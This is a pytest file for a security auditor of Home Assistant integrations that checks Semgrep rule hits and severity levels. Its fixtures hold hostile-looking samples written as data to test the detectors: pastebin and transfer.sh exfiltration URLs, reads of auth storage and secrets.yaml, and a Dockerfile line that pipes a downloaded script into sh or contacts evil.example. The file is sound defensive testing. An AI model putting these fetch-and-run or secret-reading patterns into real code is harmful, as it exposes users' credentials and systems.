"""Ajustes de ruído vindos de um relatório real (0.29.2)."""

from __future__ import annotations

import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

from auditor.capabilities import build_chains, is_test_file, profile
from auditor.engine import _group_repeats
from auditor.models import Severity
from auditor.scanners.obfuscation import _scan_python
from auditor.scanners.static import _bandit_severity

from .conftest import make_finding

PY_RULES = Path(__file__).parents[1] / "security_auditor/app/rules/semgrep/python"
VENV_SEMGREP = Path(__file__).parents[1] / ".venv/bin/semgrep"

CODE = '''
DOMAIN = "minha"
LISTA = "https://raw.githubusercontent.com/home-assistant/core/dev/strings.json"
GIST = "https://gist.githubusercontent.com/x/y/raw/a.json"
EXFIL = "https://pastebin.com/raw/abc"
STORAGE_KEY = f"{DOMAIN}.storage"
proprio = hass.config.path(".storage", f"{DOMAIN}.json")
creds = hass.config.path(".storage", "core.config_entries")
auth = open("/config/.storage/auth")
nomes = await hass.auth.async_get_users()
token = await hass.auth.async_create_refresh_token(user)
'''


def _semgrep(tmp_path, code: str = CODE) -> dict[int, set[str]]:
    exe = shutil.which("semgrep") or (str(VENV_SEMGREP) if VENV_SEMGREP.exists() else None)
    if exe is None:
        pytest.skip("semgrep não instalado")
    f = tmp_path / "x.py"
    f.write_text(code)
    res = subprocess.run([exe, "scan", "--config", str(PY_RULES), "--json", "--quiet", "--metrics=off",
                          "--disable-version-check", "--oss-only", "--no-git-ignore", str(f)],
                         capture_output=True, text=True, timeout=180, check=False,
                         env={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"})
    out: dict[int, set[str]] = {}
    for r in json.loads(res.stdout)["results"]:
        cid = r["check_id"]
        out.setdefault(r["start"]["line"], set()).add(cid[cid.rfind("auditor.") + len("auditor."):])
    return out


def _rule_meta(rule_id: str) -> dict:
    for path in PY_RULES.glob("*.yaml"):
        for rule in yaml.safe_load(path.read_text())["rules"]:
            if rule["id"] == rule_id:
                return rule["metadata"]
    raise KeyError(rule_id)


def test_github_raw_is_info_and_exfiltration_still_high(tmp_path):
    hits = _semgrep(tmp_path)
    assert "py.conteudo-github" in hits[3] and "py.destino-suspeito" not in hits[3]
    assert "py.conteudo-github" in hits[4] and "py.destino-suspeito" not in hits[4]
    assert "py.destino-suspeito" in hits[5]
    assert _rule_meta("auditor.py.conteudo-github")["severidade"] == "info"
    assert _rule_meta("auditor.py.destino-suspeito")["severidade"] == "alta"


def test_storage_rules(tmp_path):
    hits = _semgrep(tmp_path)
    assert "py.acesso-storage-auth" in hits[8] and "py.acesso-storage-auth" in hits[9]  # config_entries e auth
    assert "py.acesso-storage-auth" not in hits.get(7, set())  # arquivo da própria integração
    assert _rule_meta("auditor.py.acesso-storage")["severidade"] == "baixa"
    assert _rule_meta("auditor.py.acesso-storage-auth")["severidade"] == "critica"


def test_generic_storage_does_not_count_as_secrets():
    findings = [make_finding(component="c", rule_id="auditor.py.acesso-storage", line=1),
                make_finding(component="c", rule_id="auditor.py.url-fixa", line=2)]
    assert set(profile(findings)[("integracao", "c")]) == {"rede"}
    assert build_chains(findings) == []
    findings.append(make_finding(component="c", rule_id="auditor.py.acesso-storage-auth", line=3))
    assert [f.rule_id for f in build_chains(findings)] == ["auditor.cadeia.segredos-e-rede"]


def test_bandit_weak_hash_is_low():
    assert _bandit_severity("HIGH", "HIGH", "B324") is Severity.LOW
    assert _bandit_severity("MEDIUM", "MEDIUM", "B104") is Severity.LOW
    assert _bandit_severity("HIGH", "HIGH", "B602") is Severity.HIGH


def test_group_repeats_same_rule_same_file():
    rep = [make_finding(component="c", rule_id="auditor.py.url-fixa", file="a.py", line=n, snippet=f"u{n}",
                        severity=Severity.INFO) for n in (30, 10, 20)]
    other_file = make_finding(component="c", rule_id="auditor.py.url-fixa", file="b.py", line=1, snippet="u")
    other_rule = make_finding(component="c", rule_id="auditor.py.eval-dinamico", file="a.py", line=5)
    incomplete = [make_finding(component="c", rule_id="auditor.analise-incompleta", file=f"{n}.js", line=None,
                               snippet=None, severity=Severity.INFO) for n in ("x", "y")]
    out = _group_repeats([*rep, other_file, other_rule, *incomplete])
    assert len(out) == 4
    grouped = next(f for f in out if f.file == "a.py" and f.rule_id == "auditor.py.url-fixa")
    assert grouped.line == 10 and grouped.extra["ocorrencias"] == 3 and grouped.extra["linhas"] == [10, 20, 30]
    inc = next(f for f in out if f.rule_id == "auditor.analise-incompleta")
    assert inc.extra["ocorrencias"] == 2 and inc.extra["arquivos"] == ["x.js", "y.js"]
    # A identidade não depende da contagem: o trecho do achado agrupado é o da primeira ocorrência.
    assert grouped.snippet == "u10"


def test_listing_users_is_info_and_not_secrets(tmp_path):
    hits = _semgrep(tmp_path)
    assert "py.lista-usuarios" in hits[10] and "py.tokens-de-acesso" not in hits[10]
    assert "py.tokens-de-acesso" in hits[11]
    assert _rule_meta("auditor.py.lista-usuarios")["severidade"] == "info"
    findings = [make_finding(component="c", rule_id="auditor.py.lista-usuarios", line=1),
                make_finding(component="c", rule_id="auditor.py.url-fixa", line=2)]
    assert build_chains(findings) == []


def test_long_prose_line_is_not_obfuscation():
    prompt = 'prompt += "' + "Use the current topic to resolve follow-ups. " * 60 + '"\n'
    assert _scan_python(prompt) == []
    assert _scan_python('x = "' + "QUJD" * 700 + '"\n') == [("linha-enorme", 1)]   # texto codificado
    assert _scan_python("a=1;" * 700 + "\n") == [("linha-enorme", 1)]           # código compactado
    executed = 'exec("' + "print(1); " * 300 + '")\n'
    assert ("linha-enorme", 1) in _scan_python(executed)                          # texto que é executado


SECRETS_CODE = '''"""Loading and scrubbing of resolved ``secrets.yaml`` values."""
PROTECTED_PATHS = {
    "configuration.yaml",
    "secrets.yaml",
}
DENY_READ_BASENAMES = frozenset({"secrets.yaml", "approval_pin.json"})
ALLOWED_READ_FILES = [
    "secrets.yaml",
]
data = open(hass.config.path("secrets.yaml")).read()
other = load("/config/secrets.yaml")
msg = "could not read secrets.yaml"
LABEL = t("transfer.show")
EXFIL = "https://transfer.sh/upload"
'''


def test_secrets_yaml_protection_lists_and_prose(tmp_path):
    hits = _semgrep(tmp_path, SECRETS_CODE)
    lines = sorted(n for n, rules in hits.items() if "py.acesso-secrets-yaml" in rules)
    assert lines == [8, 10, 11]  # lista que permite ler, open() e caminho; não docstring, proteção ou mensagem
    assert "py.destino-suspeito" not in hits.get(13, set()) and "py.destino-suspeito" in hits[14]


def test_destination_regex_needs_word_boundary():
    rule = next(r for r in yaml.safe_load((PY_RULES.parents[1] / "semgrep/javascript/frontend.yaml").read_text())["rules"]
                if r["id"] == "auditor.js.destino-suspeito")
    rx = re.compile(rule["pattern-regex"])
    for text, hit in [("t('transfer.show')", False), ("https://transfer.sh/x", True), ("profile.io", False),
                      ("interact.shown", False), ("x.oast.fun", True), ("https://api.telegram.org/bot12:AB/x", True),
                      ("abc.onion", True), ("pastebin.com/raw", True)]:
        assert bool(rx.search(text)) is hit, text


def test_test_files_do_not_build_chains():
    pieces = [make_finding(component="c", rule_id="auditor.py.ip-fixo-publico", file="custom_components/c/tests/a.py",
                           line=1),
              make_finding(component="c", rule_id="auditor.py.carregamento-dinamico-de-modulo",
                           file="custom_components/c/conftest.py", line=2),
              make_finding(component="c", rule_id="auditor.py.url-fixa", file="custom_components/c/api.py", line=3)]
    assert build_chains(pieces) == []
    assert set(profile(pieces)[("integracao", "c")]) == {"rede"}
    assert is_test_file("custom_components/c/test_x.py") and not is_test_file("custom_components/c/contest.py")


IP_CODE = '''UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
DOC = "192.0.2.1"
STUN = "stun:203.0.113.5:3478"
DNS = "1.1.1.1"
URL = "http://93.184.216.34/x"
'''


def test_fixed_ip_ignores_browser_versions_and_documentation_ranges(tmp_path):
    hits = _semgrep(tmp_path, IP_CODE)
    lines = sorted(n for n, rules in hits.items() if "py.ip-fixo-publico" in rules)
    assert lines == [5]  # o 1.1.1.1 (linha 4) é DNS público conhecido: vai para ip-dns-publico
    assert "py.ip-dns-publico" in hits[4]


def test_insecure_healthcheck_on_localhost_is_not_flagged(tmp_path):
    exe = shutil.which("semgrep") or (str(VENV_SEMGREP) if VENV_SEMGREP.exists() else None)
    if exe is None:
        pytest.skip("semgrep não instalado")
    (tmp_path / "Dockerfile").write_text(
        "HEALTHCHECK CMD curl --fail http://127.0.0.1:9541 || curl --fail --insecure https://127.0.0.1:9541\n"
        "RUN curl -k https://example.com/install.sh | sh\n"
        "RUN curl --insecure https://localhost:8443 && curl -k https://evil.example/x\n"
        "RUN wget --no-check-certificate http://localhost/status\n")
    res = subprocess.run([exe, "scan", "--config", str(PY_RULES.parent / "addon"), "--json", "--quiet",
                          "--metrics=off", "--disable-version-check", "--oss-only", "--no-git-ignore",
                          str(tmp_path / "Dockerfile")], capture_output=True, text=True, timeout=180, check=False,
                         env={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"})
    lines = sorted(r["start"]["line"] for r in json.loads(res.stdout)["results"]
                   if r["check_id"].endswith("sh.tls-desativado"))
    assert lines == [2, 3]


def test_aiofile_is_not_typosquatting():
    from auditor.scanners.deps_malicious import typosquat_of
    assert typosquat_of("aiofile") is None


SECRETS_CMP = '''import os
def a(path):
    if os.path.basename(path) == "secrets.yaml" or (text := _read(path)) is None:
        return None
def never(name):
    return (
        name == "secrets.yaml"
        or ".bak" in name
    )
def b(name):
    return name in ("secrets.yaml", "x")
data = open(hass.config.path("secrets.yaml")).read()
'''


def test_comparing_with_secrets_yaml_is_low_and_not_a_secret(tmp_path):
    hits = _semgrep(tmp_path, SECRETS_CMP)
    assert all("py.acesso-secrets-yaml" not in hits.get(n, set()) for n in (3, 7, 11))
    assert all("py.compara-secrets-yaml" in hits[n] for n in (3, 7, 11))
    assert "py.acesso-secrets-yaml" in hits[12]  # abrir o arquivo continua Alta
    assert _rule_meta("auditor.py.compara-secrets-yaml")["severidade"] == "baixa"
    findings = [make_finding(component="c", rule_id="auditor.py.compara-secrets-yaml", line=1),
                make_finding(component="c", rule_id="auditor.py.url-fixa", line=2)]
    assert build_chains(findings) == []


@pytest.mark.parametrize("code, expected", [
    ("yaml.load(text, Loader=HAYamlLoader)", Severity.LOW),
    ("yaml.load(text, Loader=lambda stream: _Loader(stream, None))", Severity.LOW),
    ("yaml.load(text, Loader=yaml.Loader)", Severity.MEDIUM),
    ("yaml.load(text, Loader=yaml.UnsafeLoader)", Severity.MEDIUM),
    ("yaml.load(fh, Loader=FullLoader)", Severity.MEDIUM),
    ("yaml.load(text)", Severity.MEDIUM),
])
def test_yaml_load_with_safe_or_custom_loader_is_low(code, expected):
    from auditor.scanners.static import _yaml_load_severity
    assert _yaml_load_severity(code, Severity.MEDIUM) is expected
